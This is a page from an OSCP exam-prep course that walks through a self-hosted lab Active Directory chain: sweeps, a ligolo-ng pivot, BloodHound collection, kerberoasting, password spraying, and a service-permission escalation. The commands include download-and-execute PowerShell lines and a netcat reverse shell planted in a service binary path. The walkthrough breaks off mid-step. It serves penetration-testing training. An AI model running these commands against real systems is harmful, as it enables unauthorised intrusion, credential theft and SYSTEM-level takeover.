
  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 37 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_05

A domain controller and two Windows clients. Runs on your own machine. The download is sold in the shop, separate from membership, and is yours to keep.

[Get this chain](https://buymeacoffee.com/hackacademy/e/497364)[About this chain](https://hackerblueprint.com/labs#chain-05)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2005%3A%20GroupThink)

Tags

AD EnumerationPort ScanningPassword ReusePivotingWindows PrivescSMB EnumerationOSCP® Exam StrategyLDAP Enumeration

PreviousCompletedNext: Chain 06: TrustfallContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 05: GroupThink

Step 1 of 16

Close

0:00 / 1:08:55

Auto

1

Find the reachable hosts

BackNext step

Your lab addressesCLIENT-1 IPCLIENT-1 internal IPDC IPCLIENT-2 IPYour IPLab subnetInternal subnet

1. 1Find the reachable hosts_0:00_
    
    The lab gives us one network range and one credential. An SMB sweep of the range finds a single Windows client that belongs to a domain, hack-academy.local, and an RDP sweep finds the same host plus one machine that is not part of the domain at all. Kerberos on port 88 is checked because a domain controller always runs it, and nothing answers, which tells us the controller is not on this segment.
    
    The client's address goes into a file, and every later tool takes the target list from that file.
    
    Kali
    
    ```
    cd AD_CHAIN_5
    ```
    
    Copy
    
    Moves into the folder for this chain.
    
    **Why**The scans, the target list and the hashes of one chain belong in one folder when the report is written.
    
    Kali
    
    ```
    cat starting_credentials.txt
    ```
    
    Copy
    
    Prints the credential the lab supplied for this chain.
    
    **Why**One domain user and its password are the only way in, so we read them once instead of retyping.
    
    Kali
    
    ```
    ip route
    ```
    
    Copy
    
    Prints the routing table, including the source address of our interface.
    
    **Why**The source address is the subnet we may sweep and the address the target can reach later.
    
    Kali
    
    ```
    netexec smb 10.0.0.0/24
    ```
    
    Copy
    
    Sweeps the range over SMB with no credentials and prints one line per host that answers.
    
    **Why**SMB is open on every domain-joined Windows host, so one sweep finds the members and gives the domain name and signing state.
    
    Kali
    
    ```
    netexec rdp 10.0.0.0/24
    ```
    
    Copy
    
    Repeats the sweep for RDP on the same range.
    
    **Why**A host with RDP open is a host we may be able to log on to with the credential we hold.
    
    Kali
    
    ```
    nmap -p 88 10.0.0.0/24 -v --open
    ```
    
    Copy
    
    Scans port 88 across the range and shows only hosts with the port open.
    
    **Why**Kerberos on 88 is the mark of a domain controller, and checking it proves whether the controller is reachable from here.
    
    Kali
    
    ```
    gedit ips
    ```
    
    Copy
    
    Opens the editor to create the target list.
    
    **Why**Every netexec run below takes the same file, so the one live host is written down once.
    
    **Tip**A sweep of two or three single ports across a range is faster than a full scan and answers the one question that matters first: which hosts are domain joined.
    
2. 2Validate the credential and enumerate the client_2:24_
    
    The supplied password is accepted over SMB, and the share listing shows only the default administrative shares, which is normal for a workstation and gives us nothing yet. The RID cycle then translates identifiers into names and finds a local account called Brian, which is the kind of account that often has a weak local password. The same password is tried against it with local authentication and refused, so the local account is not a copy of the given credential.
    
    WinRM refuses the domain account on this host, so a PowerShell session is out. RDP accepts it and marks the account as able to open a desktop, which settles the next step.
    
    Kali
    
    ```
    netexec smb ips -u emiller -p 'raymond1:P'
    ```
    
    Copy
    
    Tests the given credential against the host over SMB.
    
    **Why**A valid credential is the starting point of every later spray, so it is confirmed before anything else is built on it.
    
    Kali
    
    ```
    netexec smb ips -u emiller -p 'raymond1:P' --shares
    ```
    
    Copy
    
    Lists the shares the account can read.
    
    **Why**The default administrative shares are always there; anything else would be an earlier finding.
    
    Kali
    
    ```
    netexec smb ips -u emiller -p 'raymond1:P' --rid-brute
    ```
    
    Copy
    
    Cycles the relative identifiers of the host and resolves them to account names.
    
    **Why**The RID cycle finds local accounts that no domain query returns, and a local account is a separate password to attack.
    
    Kali
    
    ```
    netexec smb ips -u brian -p 'raymond1:P' --local-auth
    ```
    
    Copy
    
    Tests the local account Brian with the given password, using the machine's own account database.
    
    **Why**--local-auth sends the logon to the local SAM, which is where a local account lives; the refusal says the password is not reused here.
    
    Kali
    
    ```
    netexec rdp ips -u brian -p 'raymond1:P' --local-auth
    ```
    
    Copy
    
    Repeats the local test over RDP.
    
    **Why**The same pair can behave differently per protocol, so the cheap check is worth one more line.
    
    Kali
    
    ```
    netexec winrm ips -u emiller -p 'raymond1:P'
    ```
    
    Copy
    
    Tests WinRM for the domain account.
    
    **Why**WinRM would give a clean remote shell with no desktop, so it is checked before the heavier RDP route.
    
    Kali
    
    ```
    netexec rdp ips -u emiller -p 'raymond1:P'
    ```
    
    Copy
    
    Tests RDP for the domain account.
    
    **Why**An RDP hit with Pwn3d means an interactive desktop, which is what the local tools need.
    
    **Tip**Run the RID cycle on every workstation you land on. Local accounts are not in the domain and are often protected by a password from an old build image.
    
3. 3Open a desktop and read the token_4:24_
    
    We connect the desktop client with three extras that matter for the rest of the chain: the certificate warning is ignored because the lab uses a self-signed certificate, the clipboard is shared so text moves both ways, and our current folder is mapped as a drive called share, which is how files will travel later.
    
    The first command in the new session reads the token. The account is an ordinary domain user on this machine, with no administrative group and no privilege worth abusing, so the local machine is not the path yet. A ping then shows the client can reach the internet, which explains why a script can be pulled straight from GitHub on this host.
    
    Kali
    
    ```
    xfreerdp3 /v:10.0.0.11 /u:emiller /p:'raymond1:P' /cert:ignore +clipboard /dynamic-resolution /drive:.,share
    ```
    
    Copy
    
    Opens an RDP desktop to the client as the domain user, ignoring the certificate and mapping the current folder as a drive.
    
    **Why**The file shares and the clipboard save a second transfer step later, and the drive mapping is how the pivot agent gets to the host without a download server.
    
    CLIENT-1 (RDP)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the account name, groups and privileges of the desktop session.
    
    **Why**This is the baseline: a plain user token, so any escalation has to come from a misconfiguration on the machines.
    
    CLIENT-1 (RDP)
    
    ```
    ping google.com
    ```
    
    Copy
    
    Sends four echo requests to a public name and prints the replies.
    
    **Why**If the client has internet access, a script can be fetched from the vendor directly and no file server is needed.
    
    **Tip**The drive mapping in the RDP client is a two way file transfer. It survives reboots of the session and needs no share on the target, which is the least noisy copy method.
    
4. 4Check the host and find the second network_6:00_
    
    The first privilege check runs in the desktop session, downloaded and executed in one line so nothing is written to disk. It reports only the classic hijackable path under a user profile, which is a false positive on current Windows, so the machine looks clean at this level.
    
    The network listing is the finding. The client has two adapters: the one we reached, and a second one on a subnet that no route from Kali covers. An SMB probe to that second address from Kali hangs, while the address we already know still answers, which proves that the second network is reachable only from inside this host. That is the case for a tunnel through the client.
    
    CLIENT-1 (RDP)
    
    ```
    powershell.exe -c "wget -useb https://raw.githubusercontent.com/punishell/ADCheatSheet/refs/heads/master/PowerUp.ps1 | iex; Invoke-AllChecks"
    ```
    
    Copy
    
    Downloads the privilege check script from its public address and runs every check in memory.
    
    **Why**Running from memory leaves no file on the host, and one line is enough because this machine already has internet access.
    
    CLIENT-1 (RDP)
    
    ```
    ipconfig
    ```
    
    Copy
    
    Prints the address of every network adapter on the host.
    
    **Why**Two adapters on two subnets is the signal that the host sits between a network we can reach and one we cannot.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u emiller -p 'raymond1:P'
    ```
    
    Copy
    
    Tries the SMB probe against the client's internal address.
    
    **Why**The address was read from the target's own adapter list, and the silence proves our machine has no route to that subnet.
    
    Kali
    
    ```
    netexec smb 10.0.0.11 -u emiller -p 'raymond1:P'
    ```
    
    Copy
    
    Runs the same probe against the address we already use.
    
    **Why**A working probe on the known address shows the silence is about routing, not about the credential or the host.
    
    **Tip**`ipconfig` on the target is the cheapest way to find a hidden network. Compare what the host sees with what your own routing table can reach.
    
5. 5Download the tunnel agent and proxy_8:12_
    
    The tunnel needs two parts: an agent that runs on the compromised client and a proxy that runs on Kali and turns the agent's connections into routes. Both come from the same release page, so we open it in the browser and copy the two asset links.
    
    The Windows agent and the Linux proxy go into one folder on Kali. The archives are unpacked, the licence and the readme are removed so the folder holds only what we need, and the proxy is started with a self-signed certificate because the agent will not validate a public one. The listening port is checked once, and the first start is stopped: it was only there to confirm the binary runs and the port is free. The start is repeated for the real run, and it is that second proxy that the agent joins later.
    
    Kali
    
    ```
    mkdir ligolo
    ```
    
    Copy
    
    Creates a folder for the tunnel binaries.
    
    **Why**Both parts of the tool live in one folder, so the proxy is started from here and the agent is served from here.
    
    Kali
    
    ```
    wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip
    ```
    
    Copy
    
    Downloads the Windows agent release archive.
    
    **Why**The agent is the piece that runs on the client; the release is version pinned so the agent and the proxy match.
    
    Kali
    
    ```
    unzip ligolo-ng_agent_0.8.2_windows_amd64.zip
    ```
    
    Copy
    
    Unpacks the agent archive.
    
    **Why**The archive holds the agent binary next to a licence and a readme, and the binary is the only file that has to travel.
    
    Kali
    
    ```
    wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
    ```
    
    Copy
    
    Downloads the Linux proxy release archive.
    
    **Why**The proxy listens on our machine and turns each agent connection into a session with interfaces and routes.
    
    Kali
    
    ```
    tar -xvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
    ```
    
    Copy
    
    Unpacks the proxy archive.
    
    **Why**The archive holds the proxy binary, and unpacking it here keeps the two halves of the tool together.
    
    Kali
    
    ```
    rm LICENSE ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz README.md
    ```
    
    Copy
    
    Removes the licence, the readme and the archive that are no longer needed.
    
    **Why**A clean folder makes the only file the web server should publish obvious.
    
    Kali
    
    ```
    ./proxy -selfcert
    ```
    
    Copy
    
    Starts the proxy with a self-signed certificate.
    
    **Why**The agent runs with certificate checking disabled, so a generated certificate is enough and no public name is needed.
    
    Kali
    
    ```
    ss -lntu
    ```
    
    Copy
    
    Lists the listening ports.
    
    **Why**The proxy listens on a single high port, and confirming that number is what the agent will be pointed at.
    
    **Tip**Match the agent and the proxy version. A mismatch usually shows up as a connection that opens and closes with no useful error.
    
6. 6Serve the agent and connect it back_11:12_
    
    The agent has to reach the proxy on our address, and there are two addresses in play: the one on the internal subnet, which the client cannot reach from our side, and the one our machine uses on the network we share with the client. We read our own interfaces to be sure which is which, then publish the folder with a plain web server.
    
    On the client we list the adapters once more as a cross check, change to the tasks folder, and pull the agent down from our server. The agent runs from that folder with certificate checking disabled and connects out to our address on the proxy port, which is the direction a firewall almost always allows.
    
    Kali
    
    ```
    ip a
    ```
    
    Copy
    
    Prints our interfaces and addresses.
    
    **Why**The agent has to call back to an address the client can reach, so we confirm which interface sits on the shared network.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Serves the current folder over HTTP on port 80.
    
    **Why**The agent binary is in this folder, so one command makes it downloadable without opening a share.
    
    CLIENT-1 (RDP)
    
    ```
    ipconfig
    ```
    
    Copy
    
    Prints the adapters and addresses of the client.
    
    **Why**The listing confirms which subnet the client shares with us, which is the address the agent must be pointed at.
    
    CLIENT-1 (RDP)
    
    ```
    cd c:\windows\tasks
    ```
    
    Copy
    
    Changes to the tasks folder on the client.
    
    **Why**The folder is writable by ordinary users, so an agent dropped here runs without any administrative right.
    
    CLIENT-1 (RDP)
    
    ```
    wget 10.0.0.13/agent.exe -o agent.exe
    ```
    
    Copy
    
    Downloads the agent from our web server into the tasks folder.
    
    **Why**The client has internet access but no need to use it: pulling from our machine keeps the tool off any third party.
    
    CLIENT-1 (RDP)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the folder to confirm the agent arrived.
    
    **Why**The binary is several megabytes, so a size check is worth the one line before running it.
    
    CLIENT-1 (RDP)
    
    ```
    ./agent -connect 10.0.0.13:11601 -ignore-cert
    ```
    
    Copy
    
    Starts the agent, pointed at our proxy address and port, with certificate validation disabled.
    
    **Why**A connection from the client to us crosses the firewall in the direction that is normally open, and the proxy accepts it without a public certificate.
    
    **Tip**Start the agent in the foreground in its own window. If the tunnel drops, the window keeps the error that explains why.
    
7. 7Turn the agent into routes_13:24_
    
    The proxy now holds a session, and the prompt moves into a console of its own. We select the session, ask for the help to see what the console offers, and list the interfaces the agent reports. The config command shows the client's two adapters, which is the same information we read with the network tool, now from the agent's point of view.
    
    The agent's own interfaces are not ours: they exist on the target. What we need is an interface on our side plus a route that sends the internal subnet through the tunnel. We read the usage of the two commands, create an interface named after the tool, add the internal subnet as its route, and start the tunnel. Once it starts, the route becomes active and ordinary tools on Kali reach the internal hosts with no extra wrapper.
    
    Kali (ligolo)
    
    ```
    session
    ```
    
    Copy
    
    Lists the sessions held by the proxy and opens one.
    
    **Why**Each agent that connects becomes a session, and every later command applies to the session we select.
    
    Kali (ligolo)
    
    ```
    help
    ```
    
    Copy
    
    Prints the commands of the agent console, grouped by interfaces, listeners and tunnelling.
    
    **Why**The console has its own command set, and the help is how we find the interface and route commands without guessing.
    
    Kali (ligolo)
    
    ```
    ifconfig
    ```
    
    Copy
    
    Prints the network adapters that the agent reports, with their addresses.
    
    **Why**Seeing the two subnets from inside the host confirms which one the tunnel has to carry.
    
    Kali (ligolo)
    
    ```
    help ifcreate
    ```
    
    Copy
    
    Prints the usage of the interface creation command.
    
    **Why**The command takes a name, and the help shows the exact flag rather than a guess at the syntax.
    
    Kali (ligolo)
    
    ```
    ifcreate --name ligolo
    ```
    
    Copy
    
    Creates an interface on our side and gives it a name.
    
    **Why**A named interface is what the route is attached to, and it keeps the tunnel separate from our normal traffic.
    
    Kali (ligolo)
    
    ```
    iflist
    ```
    
    Copy
    
    Lists the interfaces of the proxy and their routes.
    
    **Why**The new interface has no routes yet, which is the state the next command changes.
    
    Kali (ligolo)
    
    ```
    help add_route
    ```
    
    Copy
    
    Prints the usage of the route command.
    
    **Why**The command needs the interface name and a network, and the help confirms both flags.
    
    Kali (ligolo)
    
    ```
    add_route --name ligolo --route 10.0.2.0/24
    ```
    
    Copy
    
    Adds the internal subnet as a route on the named interface.
    
    **Why**This is what makes every tool on Kali send traffic for those addresses through the tunnel instead of failing at the gateway.
    
    Kali (ligolo)
    
    ```
    start
    ```
    
    Copy
    
    Starts the tunnel for the selected agent.
    
    **Why**The route stays pending until the tunnel runs; starting it is what installs the interface and its route on our machine.
    
    Kali
    
    ```
    netexec smb 10.0.2.7
    ```
    
    Copy
    
    Probes the client's internal address over SMB through the tunnel.
    
    **Why**A reply through the tunnel proves the route works before we scan a whole subnet through it.
    
    Kali
    
    ```
    netexec smb 10.0.2.0/24
    ```
    
    Copy
    
    Sweeps the whole internal subnet over SMB through the tunnel.
    
    **Why**The sweep now lists the domain controller and the second client, which were invisible before the pivot.
    
    **Tip**Use a named interface and one explicit route per subnet. Autoroute is quicker, but the routes it installs are harder to clean up and easy to confuse with real ones.
    
8. 8Enumerate the domain and build the spray files_19:36_
    
    From inside the tunnel the domain controller answers. We ask it for the domain users twice: once through a pipeline that keeps only the name column and writes it to a file, then plainly so the descriptions are readable. The descriptions mark the accounts that matter, and one of them is a web service account, which is a hint that a service ticket may be worth requesting.
    
    The target list and the password file are built here too. The internal client, the second client and the controller go into one file, and the single password we hold goes into another. A full spray with those two files confirms that the given account is the only one the password opens, and the protocol sweep that follows shows where that account is allowed to log on.
    
    Kali
    
    ```
    cd ../
    ```
    
    Copy
    
    Moves up one folder, out of the tunnel folder.
    
    **Why**The target and password files belong in the chain folder, so the spray commands below can use the short names.
    
    Kali
    
    ```
    cat starting_credentials.txt
    ```
    
    Copy
    
    Prints the supplied credential.
    
    **Why**The domain queries need the account, and reading it from the file avoids a typo in a password with a colon in it.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u emiller -p 'raymond1:P' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
    ```
    
    Copy
    
    Asks the controller for the domain users and keeps only the name column, saving the result to a file.
    
    **Why**The raw table is mostly headers; the fifth field is the account name, which is the form a spray needs.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u emiller -p 'raymond1:P' --users
    ```
    
    Copy
    
    Prints the same user table with the descriptions.
    
    **Why**The descriptions say which accounts are services, and a service account with a weak password is the next move.
    
    Kali (gedit)
    
    ```
    raymond1:P
    ```
    
    Copy
    
    The file pass holds the one password we have, ready to be sprayed.
    
    **Why**netexec takes a file for the password, so every new password is added to the same file and the spray command keeps working.
    
    Kali (gedit)
    
    ```
    10.0.2.7
    10.0.2.9
    10.0.2.4
    ```
    
    Copy
    
    The file ips holds the three internal hosts, one address per line.
    
    **Why**One list for the whole chain means the spray, the BloodHound collection and the protocol checks all hit the same targets.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass
    ```
    
    Copy
    
    Sprays every user with the password file over SMB on the three internal hosts.
    
    **Why**This answers whether the given password is reused, which is the cheapest way from one credential to another.
    
    Kali
    
    ```
    netexec winrm ips -u users -p pass
    ```
    
    Copy
    
    Repeats the spray over WinRM.
    
    **Why**WinRM access depends on group membership per host, so a hit here is a shell and a miss is not a dead end.
    
    Kali
    
    ```
    netexec rdp ips -u users -p pass
    ```
    
    Copy
    
    Repeats the spray over RDP.
    
    **Why**RDP is interactive access, which the desktop session on the first client already showed can be the way to a host.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --shares
    ```
    
    Copy
    
    Lists the shares on each host with the same credential.
    
    **Why**A share with a note or a script is a shorter path than a password, so the shares are checked for every account that answered.
    
    **Tip**Keep three files: users, pass and ips. Every tool in the chain reads them, and each new password or account only has to be added once.
    
9. 9Collect the domain into BloodHound_24:48_
    
    With the controller reachable, collection runs from Kali and asks for every object type in one pass. The zip lands in the netexec log folder and is copied to /tmp so the browser can reach it.
    
    The BloodHound stack is the same compose file the course uses, and the first start installs the missing container tools, then brings the app up on its port. The log prints the generated admin password once. In the browser we open the local address, sign in as admin with that password, and upload the zip from /tmp. From here every relationship in the directory can be read as a graph instead of guessed from output.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u emiller -p 'raymond1:P' --bloodhound --collection All --dns-server 10.0.2.4
    ```
    
    Copy
    
    Binds to the controller over LDAP and collects every object type BloodHound understands into one zip.
    
    **Why**--collection All includes sessions, local administrators and ACLs, and the DNS server flag makes the domain name resolve against the controller.
    
    Kali
    
    ```
    cp DC01_DC_IP_2026-01-08_045328_bloodhound.zip /tmp
    ```
    
    Copy
    
    Copies the collected zip to /tmp.
    
    **Why**The browser can open /tmp without looking through root's home folder, and the file name carries the collection time so nothing is overwritten.
    
    Kali
    
    ```
    curl -L https://ghst.ly/getbhce -o docker-compose.yml
    ```
    
    Copy
    
    Downloads the BloodHound compose file.
    
    **Why**One file pins the database, the graph and the web app together, so the stack starts with a single command.
    
    Kali
    
    ```
    docker-compose pull && docker-compose up -d
    ```
    
    Copy
    
    Pulls the images and starts the stack in the background.
    
    **Why**The first run installs the container tooling if it is missing, then leaves three containers running.
    
    Kali
    
    ```
    docker-compose logs bloodhound | grep -i passw
    ```
    
    Copy
    
    Reads the container log and keeps the lines that mention a password.
    
    **Why**The admin password is shown once on the first start, and this is the only place to copy it from.
    
    Kali
    
    ```
    ss -lntu
    ```
    
    Copy
    
    Lists the listening ports.
    
    **Why**The database, the graph and the web app each take a port, and seeing all three bound is the proof that the stack is ready.
    
    **Tip**Note the generated admin password in your notes before you close the terminal. The container prints it once and never again.
    
10. 10Roast the service account and fix the clock_28:00_
    
    The notes file gets a line about the pivot before the next move. The first attempt to request service tickets fails with a clock skew error, which is Kerberos refusing to work when the two clocks differ by more than five minutes. The lab machines keep their own time and our machine has drifted, so the fix is to set our clock from the controller.
    
    The command is not installed, so the package manager is asked for it and it is set from the controller address. The second request now returns a ticket for the web service account, and the ticket is written to a file. We paste the hash into its own file, decompress the wordlist, and let John attack it. The password falls in seconds because it is a short pattern a person made up.
    
    Kali
    
    ```
    cat notes
    ```
    
    Copy
    
    Prints the notes file collected so far.
    
    **Why**The notes hold the findings so far, and this is the last look before items are added.
    
    Kali
    
    ```
    gedit notes
    ```
    
    Copy
    
    Opens the notes file for editing.
    
    **Why**The pivot has to be written down while it is fresh, because the report needs the route as much as the result.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u emiller -p 'raymond1:P' --kerberoast a --dns-server 10.0.2.4
    ```
    
    Copy
    
    Asks the controller for service tickets and writes them to a file.
    
    **Why**Any domain user may request a service ticket, and the ticket is encrypted with the service account password, which makes it crackable offline.
    
    Kali
    
    ```
    rdate -n 10.0.2.4
    ```
    
    Copy
    
    Sets the local clock from the controller.
    
    **Why**Kerberos rejects requests when the clocks differ, and the controller is the authority for the domain time.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u emiller -p 'raymond1:P' --kerberoast a --dns-server 10.0.2.4
    ```
    
    Copy
    
    Repeats the ticket request after the clock is correct.
    
    **Why**The same request now succeeds, and the ticket is the hash that will be attacked offline.
    
    Kali
    
    ```
    gedit kerberoast_hash
    ```
    
    Copy
    
    Opens an editor to hold the ticket hash for the cracker.
    
    **Why**John takes a file of hashes, so the ticket is pasted into a file of its own.
    
    Kali
    
    ```
    gzip -d /usr/share/wordlists/rockyou.txt.gz
    ```
    
    Copy
    
    Decompresses the wordlist.
    
    **Why**The wordlist ships compressed on Kali, and the cracker reads the plain text file.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hash
    ```
    
    Copy
    
    Runs John against the ticket with the wordlist.
    
    **Why**A service ticket cracks offline at full speed, and the answer is the service account password in clear.
    
    **Tip**Clock skew is the usual reason a Kerberos request fails from a lab machine. Set the time from the controller before you conclude that roasting does not work.
    
11. 11Roast from the host and spray the password_33:20_
    
    The same roast is repeated from the client with a Windows tool. It is worth doing because a Windows host keeps time with the domain, so the skew that blocked us on Kali does not exist here, and the ticket can be requested without touching our clock. The tool names the web service account and writes the ticket to a file.
    
    The cracked password now goes into the password file, and the full spray runs against every account on every host. Two results matter: the service account is accepted on the second client over WinRM with administrative rights, and over RDP on the first client. We take the WinRM shell on the second client and read the token, which shows the remote management group.
    
    CLIENT-1 (RDP)
    
    ```
    .\Rubeus.exe kerberoast /outfile:hashes.txt
    ```
    
    Copy
    
    Requests service tickets from the domain using a Windows tool and writes them to a file.
    
    **Why**A domain machine already shares the controller's clock, so the request cannot fail on skew and the ticket is produced on the host.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Sprays every account with every password in the file over SMB on the three hosts.
    
    **Why**The cracked password is only worth having if it is tried against every account, because service accounts often share passwords with people.
    
    Kali
    
    ```
    netexec rdp ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Repeats the spray over RDP.
    
    **Why**RDP shows where the account can open a desktop, which matters when a shell service is closed.
    
    Kali
    
    ```
    netexec winrm ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Repeats the spray over WinRM.
    
    **Why**A WinRM hit with administrative rights gives a remote PowerShell session without a desktop, which is the cleanest way to work.
    
    Kali
    
    ```
    evil-winrm -i 10.0.2.9 -u svc_web -p oDr@gon13
    ```
    
    Copy
    
    Opens a remote PowerShell session on the second client as the service account.
    
    **Why**The winrm result showed administrative rights on that host, so this is the shell the escalation will be done from.
    
    CLIENT-2 (WinRM)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the groups and privileges of the new session.
    
    **Why**The token shows the remote management group but no administrative group, which means the administrative result comes from a local group or an ACL, not from Domain Admins.
    
    **Tip**Spraying a cracked service password across the whole domain takes seconds and often finds that the same password belongs to a person's account as well.
    
12. 12Read the service permissions_39:10_
    
    The serious privilege check runs with the new session, pulled from the vendor release so it is the current version. It reaches every check and, more importantly, it reports the services it could read with this account.
    
    One service stands out, and we read it from three angles. The query shows it stopped. The configuration shows an automatic start, a binary under a program folder, and the local system account as the owner of the process. The binary itself is protected properly: only the system account and the administrators have full control, so replacing the file is not the way in.
    
    The descriptor is the problem. It grants everyone full control of the service object, which includes the right to change its configuration. That right does not touch the file: it lets us point the service at a different binary. A second service is read only for comparison, and the same query is refused there, which shows the first one is misconfigured rather than normal.
    
    CLIENT-2 (WinRM)
    
    ```
    wget -useb https://github.com/itm4n/PrivescCheck/releases/download/2025.12.25-1/PrivescCheck.ps1 | iex; Invoke-PrivescCheck
    ```
    
    Copy
    
    Downloads the current privilege check script from its release page and runs every check.
    
    **Why**The script is maintained and versioned, and running the release build avoids an old copy that misses recent checks.
    
    CLIENT-2 (WinRM)
    
    ```
    sc.exe query AgentSvc
    ```
    
    Copy
    
    Prints the state of the agent service.
    
    **Why**A stopped service with an automatic start still runs at boot, so its state now does not block the attack.
    
    CLIENT-2 (WinRM)
    
    ```
    sc.exe qc AgentSvc
    ```
    
    Copy
    
    Prints the configuration of the service: start type, binary path and account.
    
    **Why**The three fields decide the attack: an automatic start, a path we can influence, and the system account as the runner.
    
    CLIENT-2 (WinRM)
    
    ```
    get-acl 'C:\Program Files\Tride Agent\AgentService.exe'
    ```
    
    Copy
    
    Prints the permission entries of the service binary.
    
    **Why**Reading the binary permissions first shows whether the simple file replacement is open, and here it is not.
    
    CLIENT-2 (WinRM)
    
    ```
    get-acl 'C:\Program Files\Tride Agent\AgentService.exe'|fl
    ```
    
    Copy
    
    Prints the same permissions in long list form.
    
    **Why**The long list shows each entry and its mask, which is what proves the users group has only read and execute.
    
    CLIENT-2 (WinRM)
    
    ```
    sc.exe sdshow AgentSvc
    ```
    
    Copy
    
    Prints the security descriptor of the service itself in the compact text form.
    
    **Why**The descriptor of the service is a different object from the file, and this is where the weak entry shows up.
    
    CLIENT-2 (WinRM)
    
    ```
    sc.exe sdshow AgentSvc|convertfrom-sddlstring
    ```
    
    Copy
    
    Parses that descriptor into readable access entries.
    
    **Why**Parsing turns the letter codes into names, so the entry that grants everyone full control is visible without decoding by hand.
    
    CLIENT-2 (WinRM)
    
    ```
    (sc.exe sdshow AgentSvc|convertfrom-sddlstring).DiscretionaryAcl
    ```
    
    Copy
    
    Prints only the access list of the service descriptor.
    
    **Why**The short list names every principal with full control, and the first entry is everyone, which is the finding.
    
    CLIENT-2 (WinRM)
    
    ```
    (sc.exe sdshow WSearch|convertfrom-sddlstring).DiscretionaryAcl
    ```
    
    Copy
    
    Tries the same parse on a different service descriptor.
    
    **Why**A comparison service shows what a normal descriptor looks like, and the parse fails because that descriptor cannot be read by this account.
    
    CLIENT-2 (WinRM)
    
    ```
    sc.exe sdshow WSearch
    ```
    
    Copy
    
    Tries to read the descriptor of that second service directly.
    
    **Why**The access denied answer confirms the comparison service is configured properly, which makes the first one the anomaly.
    
    **Tip**Read the descriptor of the service, not only the permissions of its binary. The binary can be locked down while the service object still lets everyone reconfigure it.
    
13. 13Point the service at netcat and catch SYSTEM_49:56_
    
    The service will not start as it is, and the error names a missing file, so the configuration is the only thing left to change. With the right to reconfigure the service, the binary path becomes our own command: a netcat binary in the writable tasks folder that starts PowerShell and connects back to us. The configuration query then shows the new path, and the change is accepted.
    
    The listener goes up on the port in that command, and the netcat binary is pulled into the tasks folder. Starting the service runs our command as the local system account. The service manager reports a timeout because our process never reports back to it, but the connection arrives on the listener and the identity check says system, which is the escalation.
    
    CLIENT-2 (WinRM)
    
    ```
    sc.exe start agentsvc
    ```
    
    Copy
    
    Tries to start the agent service.
    
    **Why**The attempt fails because the configured binary cannot be found, which is what makes reconfiguring the path the next step rather than an option.
    
    CLIENT-2 (WinRM)
    
    ```
    sc.exe query agentsvc
    ```
    
    Copy
    
    Prints the state of the service again.
    
    **Why**The service is still stopped, so the failure left nothing running behind it.
    
    CLIENT-2 (WinRM)
    
    ```
    sc.exe config agentsvc binpath= "C:\windows\tasks\nc.exe -e powershell.exe 10.0.0.13 443"
    ```
    
    Copy
    
    Changes the binary path of the service to a netcat command that starts PowerShell and connects back to us.
    
    **Why**The descriptor gives everyone the right to change the service configuration, and the service runs as the system account, so this one command puts our process in that account.
    
    CLIENT-2 (WinRM)
    
    ```
    sc.exe qc agentsvc
    ```
    
    Copy
    
    Prints the configuration again to confirm the new path.
    
    **Why**The query proves the change was written, before we spend a listener on it.
    
    Kali
    
    ```
    nc -lvnp 443
    ```
    
    Copy
    
    Starts a netcat listener on the port in the service command.
    
    **Why**The listener has to be up before the service starts, or the callback is refused and the service dies.
    
    CLIENT-2 (WinRM)
    
    ```
